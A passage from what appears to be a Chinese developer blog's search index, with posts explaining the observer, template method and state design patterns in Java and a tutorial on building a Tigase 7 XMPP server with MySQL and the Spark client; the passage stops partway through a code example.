客户端无法直接访问某个对象，或者访问对象困难，这个时候需要引入代理对象。因为客户端和实际对象之间存在代理人，代理人访问目标类时，可以做一些额外操作。代理模式因为不涉及到具体操作只是对象之间关系，所以属于代理模式。<br>举例：接上述旅游例子，A出去旅游，A朋友希望A能帮忙代购一些东西，可能因为国内物品较贵或者国内没有，这个时候A属于代理对象，A朋友属于客户端，代购物品属于目标类。</p>\n<p><strong>中介者模式：</strong> 系统对象之间需要互相联系，导致整个系统呈网状结构，系统直接存在大量多对多联系，系统过于复杂。这个时候需要改变网状结构为星状结构，引入一个中介者，系统之间联系都通知中介者，由中介者通知其他系统。<br>举例：接上诉例子，A出去旅游其实并不是自己一个人，还有其他一起的朋友，A需要代购的朋友也不止一个，旅游的朋友也有代购，这个时候就会出现沟通的问题，为了避免大家浪费时间，A组建了一个代购旅游群，大家都在里面交流，交流旅游心得、代购物品等。这个代购群，就属于中介者。</p>\n<p><strong>观察者模式：</strong> 观察者模式用于一个对象发送改变后，通知其他对象。<br>举例：接上面例子，A因为出去旅游的次数多，每次都走的旅行社，成为了旅行社的VIP，加了旅行社的公众号，因为旅行社对于这种VIP用户是有优惠活动，有优惠的时候会通知导致VIP用户。这个时候如果就是观察者模式，A以及该旅行社VIP属于观察者（订阅者），旅行社有VIP活动（目标类变动）会通知到VIP用户。</p>\n<h3 id=\"观察者总结\"><a href=\"#观察者总结\" class=\"headerlink\" title=\"观察者总结\"></a>观察者总结</h3><p>观察者模式是一种使用频率非常高的设计模式，无论是移动应用、Web应用或者桌面应用，观察者模式几乎无处不在，它为实现对象之间的联动提供了一套完整的解决方案，凡是涉及到一对一或者一对多的对象交互场景都可以使用观察者模式。观察者模式广泛应用于各种编程语言的GUI事件处理的实现，在基于事件的XML解析技术（如SAX2）以及Web事件处理中也都使用了观察者模式。</p>\n<p><strong>应用场景：</strong></p>\n<ul>\n<li>一个抽象模型有两个方面，其中一个方面依赖于另一个方面，将这两个方面封装在独立的对象中使它们可以各自独立地改变和复用。（关联行为是可拆分）</li>\n<li>一个对象的改变将导致一个或多个其他对象也发生改变，而并不知道具体有多少对象将发生改变，也不知道这些对象是谁。</li>\n<li>需要在系统中创建一个触发链，A对象的行为将影响B对象，B对象的行为将影响C对象……，可以使用观察者模式创建一种链式触发机制。</li>\n<li>跨系统的消息交换场景，如消息队列的处理机制。</li>\n</ul>\n<p><strong>优点：</strong></p>\n<ul>\n<li>观察者模式可以实现表示层和数据逻辑层的分离，定义了稳定的消息更新传递机制，并抽象了更新接口，使得可以有各种各样不同的表示层充当具体观察者角色。</li>\n<li>观察者模式在观察目标和观察者之间建立一个抽象的耦合。观察目标只需要维持一个抽象观察者的集合，无须了解其具体观察者。由于观察目标和观察者没有紧密地耦合在一起，因此它们可以属于不同的抽象化层次。</li>\n<li>观察者模式支持广播通信，观察目标会向所有已注册的观察者对象发送通知，简化了一对多系统设计的难度。</li>\n<li>观察者模式满足“开闭原则”的要求，增加新的具体观察者无须修改原有系统代码，在具体观察者与观察目标之间不存在关联关系的情况下，增加新的观察目标也很方便。</li>\n</ul>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>如果一个观察目标对象有很多直接和间接观察者，将所有的观察者都通知到会花费很多时间。</li>\n<li>如果在观察者和观察目标之间存在循环依赖，观察目标会触发它们之间进行循环调用，可能导致系统崩溃。(互相观察)</li>\n<li>观察者模式没有相应的机制让观察者知道所观察的目标对象是怎么发生变化的，而仅仅只是知道观察目标发生了变化。</li>\n</ul>\n","categories":["设计模式"],"tags":["设计模式","观察者模式","Observer Pattern"]},{"title":"Tigase7 搭建","url":"/2017/11/04/Tigase7-%E6%90%AD%E5%BB%BA/","content":"<p>因为企业内部需要使用IM，现通Tigase+Spark搭建初始项目。</p>\n<h3 id=\"下载源码\"><a href=\"#下载源码\" class=\"headerlink\" title=\"下载源码\"></a>下载源码</h3><p>访问Tigase官网，为了二次开发，下载Tigase源码。<br>下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly90aWdhc2UudGVjaC9wcm9qZWN0cy90aWdhc2Utc2VydmVyL3JlcG9zaXRvcnk=\">https://tigase.tech/projects/tigase-server/repository<i class=\"fa fa-external-link-alt\"></i></span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">下载源码</span></span><br><span class=\"line\">git clone https://git.tigase.tech/tigase-server.git</span><br><span class=\"line\">cd tigase-server</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">切换到最新tag</span></span><br><span class=\"line\">git checkout tigase-server-7.1.2</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h3 id=\"通过命令配置启动\"><a href=\"#通过命令配置启动\" class=\"headerlink\" title=\"通过命令配置启动\"></a>通过命令配置启动</h3><p>采用Mysql作为Tigase的数据库</p>\n<h4 id=\"初始化Mysql数据库\"><a href=\"#初始化Mysql数据库\" class=\"headerlink\" title=\"初始化Mysql数据库\"></a>初始化Mysql数据库</h4><ol>\n<li>在本地数据库中建立数据库tigasedb</li>\n<li>登陆mysql<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">mysql -r root -ppassword</span><br></pre></td></tr></table></figure></li>\n<li>初始化数据库<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">source database<span class=\"operator\">/</span>mysql<span class=\"operator\">-</span>schema<span class=\"number\">-7</span><span class=\"number\">-1.</span><span class=\"keyword\">sql</span></span><br></pre></td></tr></table></figure></li>\n</ol>\n<h4 id=\"修改Tigase配置文件\"><a href=\"#修改Tigase配置文件\" class=\"headerlink\" title=\"修改Tigase配置文件\"></a>修改Tigase配置文件</h4><p>修改etc&#x2F;init-mysql.properties配置文件</p>\n<figure class=\"highlight properties\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">config-type</span>=<span class=\"string\">--gen-config-def</span></span><br><span class=\"line\"><span class=\"attr\">--admins</span>=<span class=\"string\">admin@localhost</span></span><br><span class=\"line\"><span class=\"attr\">--user-db</span>=<span class=\"string\">mysql</span></span><br><span class=\"line\"><span class=\"attr\">--user-db-uri</span>=<span class=\"string\">jdbc:mysql://localhost/tigasedb?user=root&amp;password=password</span></span><br><span class=\"line\"><span class=\"attr\">--virt-hosts</span>=<span class=\"string\">localhost</span></span><br><span class=\"line\"><span class=\"attr\">--debug</span>=<span class=\"string\">server</span></span><br><span class=\"line\"><span class=\"attr\">--comp-name-1</span>=<span class=\"string\">http</span></span><br><span class=\"line\"><span class=\"attr\">--comp-class-1</span>=<span class=\"string\">tigase.http.HttpMessageReceiver</span></span><br><span class=\"line\"><span class=\"attr\">--comp-name-2</span> = <span class=\"string\">muc</span></span><br><span class=\"line\"><span class=\"attr\">--comp-class-2</span> = <span class=\"string\">tigase.muc.MUCComponent</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">muc/room-log-directory</span>=<span class=\"string\">logs/muc/</span></span><br><span class=\"line\"><span class=\"attr\">muc/search-ghosts-every-minute[B]</span>=<span class=\"string\">true</span></span><br><span class=\"line\"><span class=\"attr\">muc/muc-allow-chat-states[B]</span>=<span class=\"string\">true</span></span><br><span class=\"line\"><span class=\"attr\">muc/muc-lock-new-room[B]</span>=<span class=\"string\">false</span></span><br><span class=\"line\"><span class=\"attr\">muc/history-db</span>=<span class=\"string\">none</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"编译配置Tigase\"><a href=\"#编译配置Tigase\" class=\"headerlink\" title=\"编译配置Tigase\"></a>编译配置Tigase</h4><ol>\n<li>配置Tigase maven仓库：<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">repositories</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">repository</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">id</span>&gt;</span>tigase<span class=\"tag\">&lt;/<span class=\"name\">id</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>Tigase repository<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">url</span>&gt;</span>http://maven-repo.tigase.org/repository/release<span class=\"tag\">&lt;/<span class=\"name\">url</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">repository</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">repository</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">id</span>&gt;</span>tigase-snapshot<span class=\"tag\">&lt;/<span class=\"name\">id</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>Tigase repository<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">url</span>&gt;</span>http://maven-repo.tigase.org/repository/snapshot<span class=\"tag\">&lt;/<span class=\"name\">url</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">snapshots</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">enabled</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">enabled</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">snapshots</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">repository</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">repositories</span>&gt;</span></span><br></pre></td></tr></table></figure></li>\n<li>编译Tigase<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">mvn -Pdist -f modules/master/pom.xml clean install</span><br></pre></td></tr></table></figure>\n如果需要生成安装包程序，需要执行下面脚本，如果不需要可以不执行：<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">./scripts/installer-prepare.sh</span><br><span class=\"line\">./scripts/installer-generate.sh</span><br></pre></td></tr></table></figure>\n在执行shell脚本时，本机上需要安装git、ant、python2,、docutils、LaTeX，否则会报错。</li>\n</ol>\n<h4 id=\"命令启动Tigase\"><a href=\"#命令启动Tigase\" class=\"headerlink\" title=\"命令启动Tigase\"></a>命令启动Tigase</h4><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">./scripts/tigase.sh start etc/tigase-mysql.conf</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Spark配置登陆聊天\"><a href=\"#Spark配置登陆聊天\" class=\"headerlink\" title=\"Spark配置登陆聊天\"></a>Spark配置登陆聊天</h4><p>Spark下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pZ25pdGVyZWFsdGltZS5vcmcvcHJvamVjdHMvc3Bhcmsv\">https://igniterealtime.org/projects/spark/<i class=\"fa fa-external-link-alt\"></i></span><br>因为使用的mac，需要启动多个spark，可以通过命令 <strong>open -na spark</strong> 启动。<br>点击高级配置Spark，如图：<br><img src=\"/images/old/20171104%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-11-04%E4%B8%8B%E5%8D%883.04.00.png\"><br>通过Spark注册账号，如图：<br><img src=\"/images/old/20171104%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-11-04%E4%B8%8B%E5%8D%883.04.49.png\"><br>登陆Spark，多开后可以通过不同账号聊天，也可以通过会议群聊。</p>\n<h3 id=\"Idea启动Tigase\"><a href=\"#Idea启动Tigase\" class=\"headerlink\" title=\"Idea启动Tigase\"></a>Idea启动Tigase</h3><p>在项目中XMPPServer是启动的入口，需要配置XMPPServer启动。<br>配置如图：<br><img src=\"/images/old/20171104QQ20171104-152648@2x.png\"><br>配置参数如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">VM option：</span><br><span class=\"line\">-Dfile.encoding=UTF-8</span><br><span class=\"line\">-Dsun.jnu.encoding=UTF-8</span><br><span class=\"line\">-Djdbc.drivers=com.mysql.jdbc.Driver</span><br><span class=\"line\">-Djava.ext.dirs=/Users/你的路径/tigase-server/jars</span><br><span class=\"line\">-server</span><br><span class=\"line\">-Xms100M</span><br><span class=\"line\">-Xmx200M</span><br><span class=\"line\">-XX:PermSize=32m</span><br><span class=\"line\">-XX:MaxPermSize=256m</span><br><span class=\"line\">-XX:MaxDirectMemorySize=128m</span><br><span class=\"line\"></span><br><span class=\"line\">program arguments：</span><br><span class=\"line\">--property-file etc/init-mysql.properties</span><br><span class=\"line\"></span><br><span class=\"line\">Working directory：你的项目路径</span><br></pre></td></tr></table></figure>\n<p>启动XMPPServer服务，提供Spark测试服务是否正常。</p>\n","categories":["基础搭建"],"tags":["tigase","基础搭建"]},{"title":"Java设计模式-模板方法模式（Template Method Pattern）","url":"/2017/11/09/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F%EF%BC%88Template-Method-Pattern%EF%BC%89/","content":"<h3 id=\"模板方法\"><a href=\"#模板方法\" class=\"headerlink\" title=\"模板方法\"></a>模板方法</h3><blockquote>\n<p>定义一个操作中算法的框架，而将一些步骤延迟到子类中。模板方法模式使得子类可以不改变一个算法的结构即可重定义该算法的某些特定步骤。模板方法模式是一种基于继承的代码复用技术，它是一种类行为型模式。</p>\n</blockquote>\n<p>模板方法模式是结构最简单的行为型设计模式，在其结构中只存在父类与子类之间的继承关系。通过使用模板方法模式，可以将一些复杂流程的实现步骤封装在一系列基本方法中，在抽象父类中提供一个称之为模板方法的方法来定义这些基本方法的执行次序，而通过其子类来覆盖某些步骤，从而使得相同的算法框架可以有不同的执行结果。模板方法模式提供了一个模板方法来定义算法框架，而某些具体步骤的实现可以在其子类中完成。</p>\n<span id=\"more\"></span>\n<p>因为非常简单，省略UML类图，代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 抽象模板类</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AbstractClass</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//具体操作</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">operation</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//步骤1</span></span><br><span class=\"line\">        step1();</span><br><span class=\"line\">        <span class=\"comment\">//通过钩子判断是否执行操作2</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!skipStep2())&#123;</span><br><span class=\"line\">            step2();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//操作3，抽象方法，之类实现</span></span><br><span class=\"line\">        step3();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">step1</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;步骤1&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">skipStep2</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">step2</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;步骤2&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">step3</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 具体子类</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConcreteClass</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractClass</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">step3</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;步骤3&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>AbstractClass（抽象类）：在抽象类中定义了一系列基本操作(PrimitiveOperations)，这些基本操作可以是具体的，也可以是抽象的，每一个基本操作对应算法的一个步骤，在其子类中可以重定义或实现这些步骤。同时，在抽象类中实现了一个模板方法(Template Method)，用于定义一个算法的框架，模板方法不仅可以调用在抽象类中实现的基本方法，也可以调用在抽象类的子类中实现的基本方法，还可以调用其他对象中的方法。</li>\n<li>ConcreteClass（具体子类）：它是抽象类的子类，用于实现在父类中声明的抽象基本操作以完成子类特定算法的步骤，也可以覆盖在父类中已经实现的具体基本操作。</li>\n</ul>\n<p>因为模板方法比较简单，不用举例。</p>\n<h3 id=\"模板方法总结\"><a href=\"#模板方法总结\" class=\"headerlink\" title=\"模板方法总结\"></a>模板方法总结</h3><p><strong>适用场景：</strong></p>\n<ul>\n<li>对一些复杂的算法进行分割，将其算法中固定不变的部分设计为模板方法和父类具体方法，而一些可以改变的细节由其子类来实现。即：一次性实现一个算法的不变部分，并将可变的行为留给子类来实现。</li>\n<li>各子类中公共的行为应被提取出来并集中到一个公共父类中以避免代码重复。</li>\n<li>需要通过子类来决定父类算法中某个步骤是否执行，实现子类对父类的反向控制。</li>\n</ul>\n<p><strong>优点：</strong></p>\n<ul>\n<li>在父类中形式化地定义一个算法，而由它的子类来实现细节的处理，在子类实现详细的处理算法时并不会改变算法中步骤的执行次序。</li>\n<li>模板方法模式是一种代码复用技术，它在类库设计中尤为重要，它提取了类库中的公共行为，将公共行为放在父类中，而通过其子类来实现不同的行为，它鼓励我们恰当使用继承来实现代码复用。</li>\n<li>可实现一种反向控制结构，通过子类覆盖父类的钩子方法来决定某一特定步骤是否需要执行。</li>\n<li>在模板方法模式中可以通过子类来覆盖父类的基本方法，不同的子类可以提供基本方法的不同实现，更换和增加新的子类很方便，符合单一职责原则和开闭原则。</li>\n</ul>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>需要为每一个基本方法的不同实现提供一个子类，如果父类中可变的基本方法太多，将会导致类的个数增加，系统更加庞大，设计也更加抽象，此时，可结合桥接模式来进行设计。</li>\n</ul>\n","categories":["设计模式"],"tags":["设计模式","模板方法","Template Method Pattern"]},{"title":"Java设计模式-状态模式（State Pattern）","url":"/2017/11/09/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%8A%B6%E6%80%81%E6%A8%A1%E5%BC%8F%EF%BC%88State%20Pattern%EF%BC%89/","content":"<h3 id=\"状态设计模式\"><a href=\"#状态设计模式\" class=\"headerlink\" title=\"状态设计模式\"></a>状态设计模式</h3><blockquote>\n<p>允许一个对象在其内部状态改变时改变它的行为，对象看起来似乎修改了它的类。其别名为状态对象(Objects for States)，状态模式是一种对象行为型模式。</p>\n</blockquote>\n<p>状态模式用于解决系统中复杂对象的状态转换以及不同状态下行为的封装问题。当系统中某个对象存在多个状态，这些状态之间可以进行转换，而且对象在不同状态下行为不相同时可以使用状态模式。状态模式将一个对象的状态从该对象中分离出来，封装到专门的状态类中，使得对象状态可以灵活变化，对于客户端而言，无须关心对象状态的转换以及对象所处的当前状态，无论对于何种状态的对象，客户端都可以一致处理。</p>\n<p>UML类图如下：<br><img src=\"/images/old/20171109%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-11-09%E4%B8%8A%E5%8D%8811.07.00.png\"></p>\n<span id=\"more\"></span>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 上下文环境类</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Context</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> AbstractState state;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//状态变更后，环境方法</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">request</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        state.handle();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> AbstractState <span class=\"title function_\">getState</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> state;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setState</span><span class=\"params\">(AbstractState state)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.state = state;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 抽象状态</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AbstractState</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//抽象方法</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">handle</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 具体状态</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConcreteStateA</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractState</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">handle</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 具体状态</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConcreteStateB</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractState</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">handle</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Context（环境类）：环境类又称为上下文类，它是拥有多种状态的对象。由于环境类的状态存在多样性且在不同状态下对象的行为有所不同，因此将状态独立出去形成单独的状态类。在环境类中维护一个抽象状态类State的实例，这个实例定义当前状态，在具体实现时，它是一个State子类的对象。</li>\n<li>AbstractState（抽象状态类）：它用于定义一个接口以封装与环境类的一个特定状态相关的行为，在抽象状态类中声明了各种不同状态对应的方法，而在其子类中实现类这些方法，由于不同状态下对象的行为可能不同，因此在不同子类中方法的实现可能存在不同，相同的方法可以写在抽象状态类中。</li>\n<li>ConcreteState（具体状态类）：它是抽象状态类的子类，每一个子类实现一个与环境类的一个状态相关的行为，每一个具体状态类对应环境的一个具体状态，不同的具体状态类其行为有所不同。</li>\n</ul>\n<h3 id=\"实际例子\"><a href=\"#实际例子\" class=\"headerlink\" title=\"实际例子\"></a>实际例子</h3><p>现在有一款产品在上架前需要审核等操作，产品有多种状态。设计如下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 产品上下文环境类</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Product</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> AbstractState state;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//状态变更后，环境方法</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">request</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        state.handle();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> AbstractState <span class=\"title function_\">getState</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> state;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setState</span><span class=\"params\">(AbstractState state)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.state = state;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 状态接口</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">AbstractState</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">handle</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 具体状态</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">enum</span> <span class=\"title class_\">ProductState</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">AbstractState</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//草稿状态</span></span><br><span class=\"line\">    DRAFT &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">handle</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;保存草稿！&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"comment\">//提交审核</span></span><br><span class=\"line\">    REVIEW&#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">handle</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;保存审核状态&quot;</span>);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;通知审核人员&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"comment\">//审核通过</span></span><br><span class=\"line\">    SUCCESS&#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">handle</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;审核通过，产品上架&quot;</span>);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;通知商家&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"comment\">//审核失败</span></span><br><span class=\"line\">    FAIL&#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">handle</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;审核失败通知商家&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span>  &#123;</span><br><span class=\"line\">        <span class=\"type\">Product</span> <span class=\"variable\">product</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Product</span>();</span><br><span class=\"line\">        <span class=\"comment\">//设置</span></span><br><span class=\"line\">        